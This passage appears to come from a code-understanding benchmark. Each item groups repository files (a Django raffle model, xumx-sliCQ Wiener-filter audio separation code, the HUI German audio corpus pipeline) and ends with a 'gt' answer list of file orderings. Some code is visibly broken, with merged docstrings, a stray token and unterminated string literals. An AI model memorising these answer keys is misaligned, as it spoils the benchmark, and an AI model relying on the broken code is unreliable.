allocated_tickets(self, user=None):\n\n    query = self.raffleticket_set.filter(raffle_prize=self)\n    if user:\n      query = query.filter(user=user)\n\n    return query.count()\n\nclass RaffleTicket(models.Model):\n  user = models.ForeignKey(User)\n  raffle_prize = models.ForeignKey(RafflePrize)\n  created_at = models.DateTimeField(auto_now_add=True, editable=False)\n  updated_at = models.DateTimeField(auto_now=True, editable=False)\n",
        "gt": [
            "'makahiki/makahiki/apps/components/makahiki_profiles/models.py'",
            "'makahiki/makahiki/apps/components/prizes/models.py'",
            "'makahiki/makahiki/apps/components/prizes/tests/prize_tests.py'"
        ]
    },
    {
        "files": [
            "'xumx-sliCQ/xumx_slicq_v2/norbert/__init__.py'",
            "'xumx-sliCQ/xumx_slicq_v2/norbert/contrib.py'",
            "'xumx-sliCQ/xumx_slicq_v2/tests/test_phase.py'",
            "'xumx-sliCQ/xumx_slicq_v2/phase.py'"
        ],
        "content": "'xumx-sliCQ/xumx_slicq_v2/norbert/__init__.py'\n:\n\nimport torch\nimport math\nfrom .contrib import compress_filter, residual_model\n\n\ndef expectation_maximization(y, x, iterations=2, verbose=0, eps=None):\n    r\"\"\"Expectation maximization algorithm, for refining source separation\n    estimates.\n\n    This algorithm allows to make source separation results better by\n    enforcing multichannel consistency for the estimates. This usually means\n    a better perceptual quality in terms of spatial artifacts.\n\n    The implementation follows the details presented in [1]_, taking\n    inspiration from the original EM algorithm proposed in [2]_ and its\n    weighted refinement proposed in [3]_, [4]_.\n    It works by iteratively:\n\n     * Re-estimate source parameters (power spectral densities and spatial\n       covariance matrices) through :func:`get_local_gaussian_model`.\n\n     * Separate again the mixture with the new parameters by first computing\n       the new modelled mixture covariance matrices with :func:`get_mix_model`,\n       prepare the Wiener filters through :func:`wiener_gain` and apply them\n       with :func:`apply_filter``.\n\n    References\n    ----------\n    .. [1] S. Uhlich and M. Porcu and F. Giron and M. Enenkl and T. Kemp and\n        N. Takahashi and Y. Mitsufuji, \"Improving music source separation based\n        on deep neural networks through data augmentation and network\n        blending.\" 2017 IEEE International Conference on Acoustics, Speech\n        and Signal Processing (ICASSP). IEEE, 2017.\n\n    .. [2] N.Q. Duong and E. Vincent and R.Gribonval. \"Under-determined\n        reverberant audio source separation using a full-rank spatial\n        covariance model.\" IEEE Transactions on Audio, Speech, and Language\n        Processing 18.7 (2010): 1830-1840.\n\n    .. [3] A. Nugraha and A. Liutkus and E. Vincent. \"Multichannel audio source\n        separation with deep neural networks.\" IEEE/ACM Transactions on Audio,\n        Speech, and Language Processing 24.9 (2016): 1652-1664.\n\n    .. [4] A. Nugraha and A. Liutkus and E. Vincent. \"Multichannel music\n        separation with deep neural networks.\" 2016 24th European Signal\n        Processing Conference (EUSIPCO). IEEE, 2016.\n\n    .. [5] A. Liutkus and R. Badeau and G. Richard \"Kernel additive models for\n        source separation.\" IEEE Transactions on Signal Processing\n        62.16 (2014): 4298-4310.\n\n    Parameters\n    ----------\n    y: torch.Tensor [shape=(batch, nb_frames, nb_bins, nb_channels, nb_sources)]\n        initial estimates for the sources\n\n    x: torch.Tensor [shape=(batch, nb_frames, nb_bins, nb_channels)]\n        complex STFT of the mixture signal\n\n    iterations: int [scalar]\n        number of iterations for the EM algorithm.\n\n    verbose: boolean\n        display some information if True\n\n    eps: float or None [scalar]\n        The epsilon value to use for regularization and filters.\n        If None,  the default will use the epsilon of np.real(x) dtype.\n\n    Returns\n    -------\n    y: torch.Tensor [shape=(batch, nb_frames, nb_bins, nb_channels, nb_sources)]\n        estimated sources after iterations\n\n    v: torch.Tensor [shape=(batch, nb_frames, nb_bins, nb_sources)]\n        estimated power spectral densities\n\n    R: torch.Tensor [shape=(batch, nb_bins, nb_channels, nb_channels, nb_sources)]\n        estimated spatial covariance matrices\n\n\n    Note\n    -----\n        * You need an initial estimate for the sources to apply this\n          algorithm. This is precisely what the :func:`wiener` function does.\n\n        * This algorithm *is not* an implementation of the \"exact\" EM\n          proposed in [1]_. In particular, it does compute the posterior\n          covariance matrices the same (exact) way. Instead, it uses the\n          simplified approximate scheme initially proposed in [5]_ and further\n          refined in [3]_, [4]_, that boils down to just take the empirical\n          covariance of the recent source estimates, followed by a weighted\n          average for the update of the spatial covariance matrix. It has been\n          empirically demonstrated that this simplified algorithm is more\n          robust for music separation.\n\n    Warning\n    -------\n        It is *very* important to make sure `x.dtype` is `np.complex`\n        if you want double precision, because this function will **not**\n        do such conversion for you from `np.complex64`, in case you want the\n        smaller RAM usage on purpose.\n\n        It is usually always better in terms of quality to have double\n        precision, by e.g. calling :func:`expectation_maximization`\n        with ``x.astype(np.complex)``.\n\n        This is notably needed if you let common deep learning frameworks like\n        PyTorch or TensorFlow do the STFT, because this usually happens in\n        single precision.\n\n    Wiener-based separation for multichannel audio.\n\n    The method uses the (possibly multichannel) spectrograms `v` of the\n    sources to separate the (complex) Short Term Fourier Transform `x` of the\n    mix. Separation is done in a sequential way by:\n\n    * Getting an initial estimate. This can be done in two ways: either by\n      directly using the spectrograms with the mixture phase, or\n      by using :func:`softmask`.\n\n    * Refinining these initial estimates through a call to\n      :func:`expectation_maximization`.\n\n    This implementation also allows to specify the epsilon value used for\n    regularization. It is based on [1]_, [2]_, [3]_, [4]_.\n\n    References\n    ----------\n    .. [1] S. Uhlich and M. Porcu and F. Giron and M. Enenkl and T. Kemp and\n        N. Takahashi and Y. Mitsufuji, \"Improving music source separation based\n        on deep neural networks through data augmentation and network\n        blending.\" 2017 IEEE International Conference on Acoustics, Speech\n        and Signal Processing (ICASSP). IEEE, 2017.\n\n    .. [2] A. Nugraha and A. Liutkus and E. Vincent. \"Multichannel audio source\n        separation with deep neural networks.\" IEEE/ACM Transactions on Audio,\n        Speech, and Language Processing 24.9 (2016): 1652-1664.\n\n    .. [3] A. Nugraha and A. Liutkus and E. Vincent. \"Multichannel music\n        separation with deep neural networks.\" 2016 24th European Signal\n        Processing Conference (EUSIPCO). IEEE, 2016.\n\n    .. [4] A. Liutkus and R. Badeau and G. Richard \"Kernel additive models for\n        source separation.\" IEEE Transactions on Signal Processing\n        62.16 (2014): 4298-4310.\n\n    Parameters\n    ----------\n\n    v: torch.Tensor [shape=(batch, nb_frames, nb_bins, {1,nb_channels}, nb_sources)]\n        spectrograms of the sources. This is a nonnegative tensor that is\n        usually the output of the actual separation method of the user. The\n        spectrograms may be mono, but they need to be 4-dimensional in all\n        cases.\n\n    x: torch.Tensor [complex, shape=(batch, nb_frames, nb_bins, nb_channels)]\n        STFT of the mixture signal.\n\n    iterations: int [scalar]\n        number of iterations for the EM algorithm\n\n    use_softmask: boolean\n        * if `False`, then the mixture phase will directly be used with the\n          spectrogram as initial estimates.\n\n        * if `True`, a softmasking strategy will be used as described in\n          :func:`softmask`.\n\n    eps: {None, float}\n        Epsilon value to use for computing the separations. This is used\n        whenever division with a model energy is performed, i.e. when\n        softmasking and when iterating the EM.\n        It can be understood as the energy of the additional white noise\n        that is taken out when separating.\n        If `None`, the default value is taken as `np.finfo(np.real(x[0])).eps`.\n\n    Returns\n    -------\n\n    y: torch.Tensor\n            [complex, shape=(batch, nb_frames, nb_bins, nb_channels, nb_sources)]\n        STFT of estimated sources\n\n    Note\n    ----\n\n    * Be careful that you need *magnitude spectrogram estimates* for the\n      case `softmask==False`.\n    * We recommand to use `softmask=False` only if your spectrogram model is\n      pretty good, e.g. when the output of a deep neural net. In the case\n      it is not so great, opt for an initial softmasking strategy.\n    * The epsilon value will have a huge impact on performance. If it's large,\n      only the parts of the signal with a significant energy will be kept in\n      the sources. This epsilon then directly controls the energy of the\n      reconstruction error.\n\n    Warning\n    -------\n    As in :func:`expectation_maximization`, we recommend converting the\n    mixture `x` to double precision `np.complex` *before* calling\n    :func:`wiener`.\n\n    Separates a mixture with a ratio mask, using the provided sources\n    spectrograms estimates. Additionally allows compressing the mask with\n    a logit function for soft binarization.\n    The filter does *not* take multichannel correlations into account.\n\n    The masking strategy can be traced back to the work of N. Wiener in the\n    case of *power* spectrograms [1]_. In the case of *fractional* spectrograms\n    like magnitude, this filter is often referred to a \"ratio mask\", and\n    has been shown to be the optimal separation procedure under alpha-stable\n    assumptions [2]_.\n\n    References\n    ----------\n    .. [1] N. Wiener,\"Extrapolation, Inerpolation, and Smoothing of Stationary\n        Time Series.\" 1949.\n\n    .. [2] A. Liutkus and R. Badeau. \"Generalized Wiener filtering with\n        fractional power spectrograms.\" 2015 IEEE International Conference on\n        Acoustics, Speech and Signal Processing (ICASSP). IEEE, 2015.\n\n    Parameters\n    ----------\n    v: torch.Tensor [shape=(batch, nb_frames, nb_bins, nb_channels, nb_sources)]\n        spectrograms of the sources\n\n    x: torch.Tensor [shape=(batch, nb_frames, nb_bins, nb_channels)]\n        mixture signal\n\n    logit: {None, float between 0 and 1}\n        enable a compression of the filter. If not None, it is the threshold\n        value for the logit function: a softmask above this threshold is\n        brought closer to 1, and a softmask below is brought closer to 0.\n\n    Returns\n    -------\n    Tensor, shape=(batch, nb_frames, nb_bins, nb_channels, nb_sources)\n        estimated sources\n\n\n    Invert matrices, with special fast handling of the 1x1 and 2x2 cases.\n\n    Will generate errors if the matrices are singular: user must handle this\n    through his own regularization schemes.\n\n    Parameters\n    ----------\n    M: torch.Tensor [shape=(..., nb_channels, nb_channels)]\n        matrices to invert: must be square along the last two dimensions\n\n    eps: [scalar]\n        regularization parameter to use _only in the case of matrices\n        bigger than 2x2\n\n    Returns\n    -------\n    invM: torch.Tensor, [shape=M.shape]\n        inverses of M\n\n    Compute the wiener gain for separating one source, given all parameters.\n    It is the matrix applied to the mix to get the posterior mean of the source\n    as in [1]_\n\n    References\n    ----------\n    .. [1] N.Q. Duong and E. Vincent and R.Gribonval. \"Under-determined\n        reverberant audio source separation using a full-rank spatial\n        covariance model.\" IEEE Transactions on Audio, Speech, and Language\n        Processing 18.7 (2010): 1830-1840.\n\n    Parameters\n    ----------\n    v_j: torch.Tensor [shape=(batch, nb_frames, nb_bins, nb_sources)]\n        power spectral density of the target source.\n\n    R_j: torch.Tensor [shape=(batch, nb_bins, nb_channels, nb_channels, nb_sources)]\n        spatial covariance matrix of the target source\n\n    inv_Cxx: torch.Tensor [shape=(batch, nb_frames, nb_bins, nb_channels, nb_channels)]\n        inverse of the mixture covariance matrices\n\n    Returns\n    -------\n\n    G: torch.Tensor [shape=(batch, nb_frames, nb_bins, nb_channels, nb_channels, nb_sources)]\n        wiener filtering matrices, to apply to the mix, e.g. through\n        :func:`apply_filter` to get the target source estimate.\n\n    \"\"\"\n\n    G = torch.einsum('zbcds,znbde->znbces', R_j, inv_Cxx) * \\\n        v_j[..., None, None, :]\n    return G\n\n\ndef apply_filter(x: torch.Tensor, W: torch.Tensor):\n\n    W = W.permute(0, 1, 2, 5, 3, 4)\n    x = x[..., None, :, None]\n    y_hat = W @ x\n    y_hat = y_hat.squeeze(-1).permute(0, 1, 2, 4, 3)\n    return y_hat.contiguous()\n\n\ndef get_mix_model(v: torch.Tensor, R: torch.Tensor):\n\n    if R.is_complex():\n        v = v.to(R.dtype)\n    Cxx = torch.einsum('znbs,zbcds->znbcd', v, R)\n    return Cxx\n\n\ndef _covariance(y_j: torch.Tensor):\n\n    Cj = y_j.unsqueeze(-1) * y_j.unsqueeze(-2).conj()\n    return Cj\n\n\ndef get_local_gaussian_model(y_j: torch.Tensor, eps=1.):\n    r\"\"\"\n    Compute the local Gaussian model [1]_ for a source given the complex STFT.\n    First get the power spectral densities, and then the spatial covariance\n    matrix, as done in [1]_, [2]_\n\n    References\n    ----------\n    .. [1] N.Q. Duong and E. Vincent and R.Gribonval. \"Under-determined\n        reverberant audio source separation using a full-rank spatial\n        covariance model.\" IEEE Transactions on Audio, Speech, and Language\n        Processing 18.7 (2010): 1830-1840.\n\n    .. [2] A. Liutkus and R. Badeau and G. Richard. \"Low bitrate informed\n        source separation of realistic mixtures.\" 2013 IEEE International\n        Conference on Acoustics, Speech and Signal Processing. IEEE, 2013.\n\n    Parameters\n    ----------\n    y_j: torch.Tensor [shape=(batch, nb_frames, nb_bins, nb_channels)]\n          complex stft of the source.\n    eps: float [scalar]\n        regularization term\n\n    Returns\n    -------\n    v_j: torch.Tensor [shape=(batch, nb_frames, nb_bins)]\n        power spectral density of the source\n    R_J: torch.Tensor [shape=(batch, nb_bins, nb_channels, nb_channels)]\n        Spatial covariance matrix of the source\n\n    Compute a model for the residual based on spectral subtraction.\n\n    The method consists in two steps:\n\n    * The provided spectrograms are summed up to obtain the *input* model for\n      the mixture. This *input* model is scaled frequency-wise to best\n      fit with the actual observed mixture spectrogram.\n\n    * The residual model is obtained through spectral subtraction of the\n      input model from the mixture spectrogram, with flooring to 0.\n\n    Parameters\n    ----------\n    v: torch.Tensor [shape=(batch, nb_frames, nb_bins, {1, nb_channels}, nb_sources)]\n        Estimated spectrograms for the sources\n\n    x: torch.Tensor [shape=(batch, nb_frames, nb_bins, nb_channels)]\n        complex mixture\n\n    alpha: float [scalar]\n        exponent for the spectrograms `v`. For instance, if `alpha==1`,\n        then `v` must be homogoneous to magnitudes, and if `alpha==2`, `v`\n        must homogeneous to squared magnitudes.\n    autoscale: boolean\n        in the case you know that the spectrograms will not have the right\n        magnitude, it is important that the models are scaled so that the\n        residual is correctly estimated.\n\n    Returns\n    -------\n    v: torch.Tensor [shape=(batch, nb_frames, nb_bins, nb_channels, nb_sources+1)]\n        Spectrograms of the sources, with an appended one for the residual.\n\n    Note\n    ----\n    It is not mandatory to input multichannel spectrograms. However, the\n    output spectrograms *will* be multichannel.\n\n    Warning\n    -------\n    You must be careful to set `alpha` as the exponent that corresponds to `v`.\n    In other words, *you must have*: ``np.abs(x)**alpha`` homogeneous to `v`.\n\n    smoothes a ndarray with a Gaussian blur.\n\n    Parameters\n    ----------\n    v: torch.Tensor [shape=(nb_frames, ...)]\n        input array\n\n    sigma: int [scalar]\n        lengthscale of the gaussian blur\n\n    temporal: boolean\n        if True, will smooth only along time through 1d blur. Will use a\n        multidimensional Gaussian blur otherwise.\n\n    Returns\n    -------\n    result: torch.Tensor [shape=(nb_frames, ...)]\n        filtered array\n\n\n    Reduction of interferences between spectrograms.\n\n    The objective of the method is to redistribute the energy of the input in\n    order to \"sparsify\" spectrograms along the \"source\" dimension. This is\n    motivated by the fact that sources are somewhat sparse and it is hence\n    unlikely that they are all energetic at the same time-frequency bins.\n\n    The method is inspired from [1]_ with ad-hoc modifications.\n\n    References\n    ----------\n\n   .. [1] Thomas Prätzlich, Rachel Bittner, Antoine Liutkus, Meinard Müller.\n           \"Kernel additive modeling for interference reduction in multi-\n           channel music recordings\" Proc. of ICASSP 2015.\n\n    Parameters\n    ----------\n    v: torch.Tensor [shape=(..., nb_sources)]\n        non-negative data on which to apply interference reduction\n\n    thresh: float [scalar]\n        threshold for the compression, should be between 0 and 1. The closer\n        to 1, the more reduction of the interferences, at the price of more\n        distortion.\n\n    slope: float [scalar]\n            the slope at which binarization is done. The higher, the more\n            brutal\n\n    Returns\n    -------\n    v: torch.Tensor [same shape as input]\n        `v` with reduced interferences\n\n    \"\"\"\n    eps = 1e-7\n    vsmooth = smooth(v.detach().cpu().numpy(), 10)\n    vsmooth = torch.from_numpy(vsmooth).to(v.device).to(v.dtype)\n    total_energy = eps + vsmooth.sum(-1, keepdim=True)\n    v = _logit(vsmooth / total_energy, thresh, slope) * v\n    return v\n\n\ndef compress_filter(W, thresh=0.6, slope=15):\n\n\n    eps = torch.finfo(W.dtype).eps\n    nb_channels = W.shape[-1]\n    if nb_channels > 1:\n        gains = torch.einsum('...ii', W)\n        W *= (_logit(gains, thresh, slope) / (eps + gains))[..., None, None]\n    else:\n        W = _logit(W, thresh, slope)\n    return W\n\n'xumx-sliCQ/xumx_slicq_v2/tests/test_phase.py'\n:import torch\nfrom xumx_slicq_v2.phase import blockwise_wiener, wiener\n\n\n\ndef test_blockwise_wiener():\n    mix_slicqt = torch.randn((1, 2, 14, 257, 37, 2))\n    slicqtgrams = torch.randn((4, 1, 2, 14, 257, 37))\n    wiener_win_len_param = 5000\n    targets_slicqt = blockwise_wiener(mix_slicqt, slicqtgrams, wiener_win_len_param)\n    assert targets_slicqt.shape == (4, 1, 2, 14, 257, 37, 2)\n    assert torch.all(torch.isfinite(targets_slicqt))\n\n\n\ndef test_wiener():\n    mix_slicqt = [torch.randn((1, 2, 14, 257, 37, 2)) for i in range(4)]\n    slicqtgrams = [torch.randn((4, 1, 2, 14, 257, 37)) for i in range(4)]\n    wiener_win_len_param = 5000\n    targets_slicqt = wiener(mix_slicqt, slicqtgrams, wiener_win_len_param)\n    assert all([targets_slicqt[i].shape == (4, 1, 2, 14, 257, 37, 2) for i in range(4)])\n    assert all([torch.all(torch.isfinite(targets_slicqt[i])) for i in range(4)])\n\n'xumx-sliCQ/xumx_slicq_v2/phase.py'\n:import torch\nfrom typing import List\nimport xumx_slicq_v2.norbert as norbert\n\n\n\ndef wiener(mix_slicqt, slicqtgrams, wiener_win_len: int = 5000):\n    targets_slicqt = [None] * len(mix_slicqt)\n    for i, (mix_slicqt_block, slicqtgrams_block) in enumerate(\n        zip(mix_slicqt, slicqtgrams)\n    ):\n        targets_slicqt[i] = blockwise_wiener(\n            mix_slicqt_block, slicqtgrams_block, wiener_win_len\n        )\n    return targets_slicqt\n\n\ndef blockwise_wiener(mix_slicqt, slicqtgrams, wiener_win_len_param: int = 5000):\n    mix_slicqt = torch.flatten(mix_slicqt, start_dim=-3, end_dim=-2)\n    orig_shape = slicqtgrams.shape\n    slicqtgrams = torch.flatten(slicqtgrams, start_dim=-2, end_dim=-1)\n\n\n\n    slicqtgrams = slicqtgrams.permute(1, 4, 3, 2, 0)\n\n\n\n\n    mix_slicqt = mix_slicqt.permute(0, 3, 2, 1, 4)\n\n    nb_frames = slicqtgrams.shape[1]\n    targets_slicqt = torch.zeros(\n        *mix_slicqt.shape[:-1]\n        + (\n            4,\n            2,\n        ),\n        dtype=mix_slicqt.dtype,\n        device=mix_slicqt.device,\n    )\n\n    pos = 0\n    if wiener_win_len_param:\n        wiener_win_len = wiener_win_len_param\n    else:\n        wiener_win_len = nb_frames\n    while pos < nb_frames:\n        cur_frame = torch.arange(pos, min(nb_frames, pos + wiener_win_len))\n        pos = int(cur_frame[-1]) + 1\n\n        targets_slicqt[:, cur_frame, ...] = torch.view_as_real(\n            norbert.wiener(\n                slicqtgrams[:, cur_frame, ...],\n                torch.view_as_complex(mix_slicqt[:, cur_frame, ...]),\n                1,\n                False,\n            )\n        )\n\n\n    targets_slicqt = targets_slicqt.permute(4, 0, 3, 2, 1, 5).contiguous()\n    targets_slicqt = targets_slicqt.reshape(\n        (\n            *orig_shape,\n            2,\n        )\n    )\n    return targets_slicqt\n\n\ndef _atan2(y, x):\n    r\n    pi = 2 * torch.asin(torch.as_tensor(1.0))\n    x += ((x == 0) & (y == 0)) * 1.0\n    out = torch.atan(y / x)\n    out += ((y >= 0) & (x < 0)) * pi\n    out -= ((y < 0) & (x < 0)) * pi\n    out *= 1 - ((y > 0) & (x == 0)) * 1.0\n    out += ((y > 0) & (x == 0)) * (pi / 2)\n    out *= 1 - ((y < 0) & (x == 0)) * 1.0\n    out += ((y < 0) & (x == 0)) * (-pi / 2)\n    return out\n\n\ndef blockwise_phasemix_sep(X_block, Ymag_block):\n    Xphase_block = _atan2(X_block[..., 1], X_block[..., 0])\n\n\n    Ycomplex_block_real = torch.empty_like(Ymag_block)\n    Ycomplex_block_imag = torch.empty_like(Ymag_block)\n\n    Ycomplex_block_real = Ymag_block[:, ...] * torch.cos(Xphase_block)\n    Ycomplex_block_imag = Ymag_block[:, ...] * torch.sin(Xphase_block)\n\n    Ycomplex = torch.cat(\n        [\n            torch.unsqueeze(Ycomplex_block_real, dim=-1),\n            torch.unsqueeze(Ycomplex_block_imag, dim=-1),\n        ],\n        dim=-1,\n    )\n    return Ycomplex\n\n\ndef abs_of_real_complex(Xcomplex_real_view):\n\n    return torch.sqrt(Xcomplex_real_view[..., 0] ** 2 + Xcomplex_real_view[..., 1] ** 2)\n\n\n\ndef phasemix_sep(X: List[torch.Tensor], Ymag: List[torch.Tensor]):\n    Ycomplex = [None] * len(X)\n    for i, (X_block, Ymag_block) in enumerate(zip(X, Ymag)):\n        Ycomplex[i] = blockwise_phasemix_sep(X_block, Ymag_block)\n    return Ycomplex\n",
        "gt": [
            "'xumx-sliCQ/xumx_slicq_v2/norbert/contrib.py'",
            "'xumx-sliCQ/xumx_slicq_v2/norbert/__init__.py'",
            "'xumx-sliCQ/xumx_slicq_v2/phase.py'",
            "'xumx-sliCQ/xumx_slicq_v2/tests/test_phase.py'"
        ]
    },
    {
        "files": [
            "'HUI-Audio-Corpus-German/huiAudioCorpus/workflows/createDatasetWorkflow/Step7_AudioRawStatistic.py'",
            "'HUI-Audio-Corpus-German/huiAudioCorpus/utils/ModelToStringConverter.py'",
            "'HUI-Audio-Corpus-German/huiAudioCorpus/workflows/createDatasetWorkflow/Step5_AlignText.py'",
            "'HUI-Audio-Corpus-German/huiAudioCorpus/calculator/AlignSentencesIntoTextCalculator.py'",
            "'HUI-Audio-Corpus-German/huiAudioCorpus/dependencyInjection/DependencyInjection.py'",
            "'HUI-Audio-Corpus-German/huiAudioCorpus/model/SentenceAlignment.py'"
        ],
        "content": "'HUI-Audio-Corpus-German/huiAudioCorpus/workflows/createDatasetWorkflow/Step7_AudioRawStatistic.py'\n:from huiAudioCorpus.utils.DoneMarker import DoneMarker\nfrom huiAudioCorpus.utils.PathUtil import PathUtil\nimport pandas as pd\nimport os\n\n\nclass Step7_AudioRawStatistic:\n    def __init__(self, savePath: str, loadPath: str, pathUtil: PathUtil):\n        self.savePath = savePath\n        self.pathUtil = pathUtil\n        self.loadPath = loadPath\n\n    def run(self):\n        doneMarker = DoneMarker(self.savePath)\n        result = doneMarker.run(self.script, deleteFolder=False)\n        return result\n\n    def script(self):\n        from huiAudioCorpus.dependencyInjection.DependencyInjection import DependencyInjection\n        speackers = os.listdir(self.loadPath)\n        audioInfos = []\n        for speacker in speackers:\n            if speacker == '.done':\n                continue\n            print('finalSummary: ' + speacker)\n            loadPath = self.loadPath  + '/' + speacker\n            savePath = self.savePath + '/' + speacker\n            saveFile = savePath + '/overview.csv'\n            self.pathUtil.createFolderForFile(saveFile)\n            localDoneMarker = DoneMarker(savePath)\n            if localDoneMarker.isDone():\n                rawDataAudio = pd.read_csv(saveFile, sep='|' , index_col='id')\n            else:\n                diConfig = {\n                    'audioPersistenz': {\n                        'loadPath': loadPath,\n                    }\n                }\n                rawDataAudio = DependencyInjection(diConfig).audioStatisticComponent.loadAudioFiles()\n                rawDataAudio['speacker'] = speacker\n\n                diConfig = {\n                    'transcriptsPersistenz': {\n                        'loadPath': loadPath,\n                    }\n                }\n                rawDataText = DependencyInjection(diConfig).textStatisticComponent.loadTextFiles()\n                rawData = rawDataAudio.merge(rawDataText, how='outer', on='id' )\n                rawData.to_csv(saveFile , sep='|')\n\n                localDoneMarker.setDone()\n\n            audioInfos.append(rawDataAudio)\n\n        audio = pd.concat(audioInfos)\n        audio.to_csv(self.savePath  + '/overview.csv', sep='|')\n'HUI-Audio-Corpus-German/huiAudioCorpus/utils/ModelToStringConverter.py'\n:classHighlither = '\nendOfClass = '____'\n\nclass ToString():\n    def __str__(self):\n        return ModelToStringConverter().convert(self)\n\nclass ModelToStringConverter:\n    def convert(self, model):\n        strings =[]\n        strings.append( self.getClassText(model))\n        strings.append('')\n        attributes = self.getAllAttributes(model)\n        [strings.append(self.getMethodText(model, attr)) for attr in attributes]\n        strings.append(endOfClass)\n        string = '\\n'.join(strings)\n        return string\n\n    def getClassText(self,model):\n        string = classHighlither + ' ' + model.__class__.__name__ + ' ' + classHighlither\n        return string\n\n    def getAllAttributes(self, model):\n        attr:str\n        allAttributes = dir(model)\n        allAttributes = [attr for attr in allAttributes if not attr.startswith('__')]\n        return allAttributes\n\n    def getMethodText(self,model, methodName: str):\n        value = getattr(model, methodName)\n        valueString = self.getValueText(value)\n        string = methodName + ' ' +  str(type(value)) +': ' + valueString\n        return string\n\n    def getValueText(self, value):\n        if isinstance(value, float):\n            return str(round(value,2))\n\n        string = str(value)\n        if len(string)>20:\n            return string[:20] + ' ...'\n        return str(value)\n'HUI-Audio-Corpus-German/huiAudioCorpus/workflows/createDatasetWorkflow/Step5_AlignText.py'\n:from huiAudioCorpus.model.Transcripts import Transcripts\nfrom pandas.core.frame import DataFrame\nfrom huiAudioCorpus.model.Sentence import Sentence\nfrom huiAudioCorpus.calculator.AlignSentencesIntoTextCalculator import AlignSentencesIntoTextCalculator\nfrom huiAudioCorpus.persistenz.TranscriptsPersistenz import TranscriptsPersistenz\nfrom huiAudioCorpus.utils.DoneMarker import DoneMarker\n\nclass Step5_AlignText:\n\n    def __init__(self, savePath: str, alignSentencesIntoTextCalculator: AlignSentencesIntoTextCalculator, transcriptsPersistenz: TranscriptsPersistenz, textToAlignPath: str):\n        self.savePath = savePath\n        self.alignSentencesIntoTextCalculator = alignSentencesIntoTextCalculator\n        self.transcriptsPersistenz = transcriptsPersistenz\n        self.textToAlignPath = textToAlignPath\n\n    def run(self):\n        doneMarker = DoneMarker(self.savePath)\n        result = doneMarker.run(self.script, deleteFolder=False)\n        return result\n\n    def script(self):\n        transcripts = list(self.transcriptsPersistenz.loadAll())\n        sentences = transcripts[0].sentences()\n        with open(self.textToAlignPath, 'r', encoding='utf8') as f:\n            inputText = f.read()\n        inputSentence = Sentence(inputText)\n\n        alignments = self.alignSentencesIntoTextCalculator.calculate(inputSentence,sentences )\n        notPerfektAlignments = [align for align in alignments if not align.isPerfect and not align.isSkipped]\n        for align in notPerfektAlignments:\n            print('------------------')\n            print(align.sourceText.id)\n            print(align.alignedText.sentence)\n            print(align.sourceText.sentence)\n            print(align.leftIsPerfekt)\n            print(align.rightIsPerfekt)\n            print(align.distance)\n\n        print(\"notPerfektAlignments Percent\",len(notPerfektAlignments)/len(alignments)*100)\n\n        results = [[align.sourceText.id, align.alignedText.sentence]for align in alignments  if align.isPerfect]\n\n        csv =  DataFrame(results)\n        transcripts = Transcripts(csv, 'transcripts', 'transcripts')\n        self.transcriptsPersistenz.save(transcripts)\n\n        resultsNotPerfect = [[align.sourceText.id, align.alignedText.sentence]for align in alignments  if not align.isPerfect]\n\n        csv =  DataFrame(resultsNotPerfect)\n        transcripts = Transcripts(csv, 'transcriptsNotPerfect', 'transcriptsNotPerfect')\n        self.transcriptsPersistenz.save(transcripts)\n\n'HUI-Audio-Corpus-German/huiAudioCorpus/calculator/AlignSentencesIntoTextCalculator.py'\n:import operator\nfrom nltk.sem.evaluate import Error\nfrom tqdm import tqdm\nfrom huiAudioCorpus.model.SentenceAlignment import SentenceAlignment\nfrom typing import List\nfrom huiAudioCorpus.model.Sentence import Sentence\nfrom huiAudioCorpus.transformer.SentenceDistanceTransformer import SentenceDistanceTransformer\nfrom joblib import Parallel, delayed\n\nrangeWords = 40\nclass AlignSentencesIntoTextCalculator:\n\n    def __init__(self, sentenceDistanceTransformer: SentenceDistanceTransformer):\n        self.sentenceDistanceTransformer = sentenceDistanceTransformer\n\n    def calculate(self, originalText: Sentence, textToAlign: List[Sentence]):\n\n        alignments = self.calculateAlignments(originalText,textToAlign)\n        alignments = self.evaluateIfPerfektStartAndEnd(alignments,originalText.wordsCount)\n        alignments = self.getMissingWordsBetweenAlignments(alignments, originalText)\n        return alignments\n\n    def calculateAlignments(self, originalText: Sentence, textToAlign: List[Sentence]):\n        with Parallel(n_jobs=15, batch_size=500) as parallel:\n            alignments:List[SentenceAlignment] = []\n            start=0\n            text: Sentence\n            additionalRange =  0\n            for text in tqdm(textToAlign):\n\n\n                rangeStart= max(0,start-rangeWords - additionalRange)\n                rangeEnd = min(rangeStart+2*(rangeWords + additionalRange)+text.wordsCount,originalText.wordsCount+1)\n\n                if rangeEnd- rangeStart>2000:\n                    raise Exception('more than 2000 Words in search text')\n\n                (newStart, end), distance = self.bestPosition(parallel,originalText[rangeStart: rangeEnd ], text, 0, rangeEnd- rangeStart)\n                newStart += rangeStart\n                end += rangeStart\n\n                align = SentenceAlignment(text, originalText[newStart: end],newStart, end, distance)\n                if distance>0.2:\n                    print('*****************')\n                    print('skip because of too high distance: ',text.id, distance)\n                    print('*****************')\n                    print(text.sentence)\n                    print('___________________')\n                    print(originalText[rangeStart: rangeEnd ].sentence)\n                    print('\n\n                    align.isSkipped = True\n                    additionalRange += 30 + text.wordsCount\n                else:\n                    start = end\n                    additionalRange= 0\n                alignments.append(align)\n            return alignments\n\n    def bestPosition(self,parallel:Parallel, originalText: Sentence, textToAlign: Sentence, rangeStart: int, rangeEnd: int):\n        startEnds = []\n        for end in range(rangeStart, rangeEnd):\n            for start in range(max(rangeStart,end-textToAlign.wordsCount-10), end):\n                startEnds.append((start, end))\n\n        positionene = parallel(delayed(self.positionOneSentence)(originalText, textToAlign, start, end) for start, end in startEnds)\n\n\n        bestPosition = min(positionene, key=operator.itemgetter(1))\n        return  bestPosition\n\n    def positionOneSentence(self, originalText: Sentence , textToAlign: Sentence, start: int, end: int):\n        textToSearch = originalText[start:end]\n        distance = self.sentenceDistanceTransformer.transform(textToSearch, textToAlign)\n        return [(start, end), distance]\n\n\n    def evaluateIfPerfektStartAndEnd(self,alignments:  List[SentenceAlignment], originalTextLength: int):\n        for index, align in enumerate(alignments):\n            align.leftIsPerfekt = False\n            align.rightIsPerfekt = False\n            align.isFirst = index ==0\n            align.isLast = index == len(alignments)-1\n\n            if align.start==0:\n                align.leftIsPerfekt=True\n            if align.end == originalTextLength:\n                align.rightIsPerfekt= True\n\n            try:\n                if align.start == alignments[index-1].end:\n                    align.leftIsPerfekt=True\n            except:\n                pass\n            try:\n                if align.end == alignments[index+1].start:\n                    align.rightIsPerfekt=True\n            except:\n                pass\n            align.isPerfect 